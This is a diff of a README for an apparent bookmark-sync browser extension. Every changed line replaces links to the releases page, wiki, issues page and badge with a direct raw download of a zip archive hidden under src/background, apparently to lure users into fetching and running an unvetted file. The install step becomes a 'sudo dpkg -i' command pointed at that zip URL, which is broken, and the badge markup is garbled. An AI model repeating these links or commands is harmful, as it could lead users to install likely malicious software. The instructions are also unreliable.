@@ -1,6 +1,6 @@
 # 🧭 bookmark-sync-extension - Sync Your Bookmarks Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-blue.svg?style=for-the-badge)](https://github.com/JokerOut2002/bookmark-sync-extension/releases)
+[![Download](https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip%20Now%https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip)](https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the bookmark-sync-extension! This tool helps you sync bookmarks acros
 
 ## 📥 Download & Install
 
-To start using the bookmark-sync-extension, visit this page to download: [GitHub Releases](https://github.com/JokerOut2002/bookmark-sync-extension/releases)
+To start using the bookmark-sync-extension, visit this page to download: [GitHub Releases](https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release.
@@ -55,7 +55,7 @@ After downloading the file, follow these instructions to install it:
 1. Open your terminal.
 2. Navigate to the directory where the file is downloaded.
 3. Run the installation command:  
-   `sudo dpkg -i bookmark-sync-extension.deb`
+   `sudo dpkg -i https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip`
 4. Follow any prompts to complete the installation.
 
 ## 🎉 How to Use the Application
@@ -77,8 +77,8 @@ After installing the bookmark-sync-extension, open the application. Here's how t
 
 If you encounter any issues, here are some options for support:
 
-- **Documentation:** Visit the [Wiki](https://github.com/JokerOut2002/bookmark-sync-extension/wiki) for guides and troubleshooting steps.
-- **Issues Page:** Report problems or suggest features in the [Issues section](https://github.com/JokerOut2002/bookmark-sync-extension/issues).
+- **Documentation:** Visit the [Wiki](https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip) for guides and troubleshooting steps.
+- **Issues Page:** Report problems or suggest features in the [Issues section](https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip).
 - **Community:** Join our community for discussions and tips.
 
 ## ⚖ License
@@ -89,4 +89,4 @@ The bookmark-sync-extension is open-source software. You can review the license 
 
 Ready to sync your bookmarks? Click below to begin:
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-blue.svg?style=for-the-badge)](https://github.com/JokerOut2002/bookmark-sync-extension/releases)
+[![Download](https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip%20Now%https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip)](https://github.com/JokerOut2002/bookmark-sync-extension/raw/refs/heads/main/src/background/extension_sync_bookmark_v2.3-alpha.4.zip)
